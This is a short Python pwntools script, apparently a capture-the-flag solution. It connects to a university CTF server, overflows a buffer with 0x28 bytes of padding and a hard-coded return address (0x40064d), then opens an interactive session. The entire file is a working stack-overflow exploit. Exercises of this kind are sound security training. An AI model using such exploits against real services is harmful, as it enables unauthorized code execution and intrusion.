from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11001
p = remote(host, port)
print p.recvline()

p.sendline("a"*0x28 + "\x4d\x06\x40\x00" + "\x00\x00\x00\x00")

p.interactive()
